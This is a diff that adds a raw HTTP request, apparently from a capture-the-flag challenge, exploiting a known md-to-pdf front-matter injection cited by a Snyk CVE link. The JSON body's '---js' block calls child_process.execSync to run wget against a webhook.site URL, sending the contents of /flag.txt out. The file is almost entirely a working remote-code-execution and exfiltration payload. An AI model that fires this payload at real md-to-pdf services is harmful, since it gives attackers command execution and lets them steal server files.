@@ -1,0 +1,16 @@
+POST /api/invoice/add HTTP/1.1
+Host: 83.136.254.47:32801
+Content-Length: 157
+Accept-Language: es-ES,es;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://83.136.254.47:32801
+Referer: http://83.136.254.47:32801/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"markdown_content":"---js\n((require('child_process')).execSync('wget https://webhook.site/fc8986c5-4996-4bd8-9829-02a5088026ad/$(cat /flag.txt)'))\n---RC"}
+
+
+CVE: https://security.snyk.io/package/npm/md-to-pdf/4.1.0
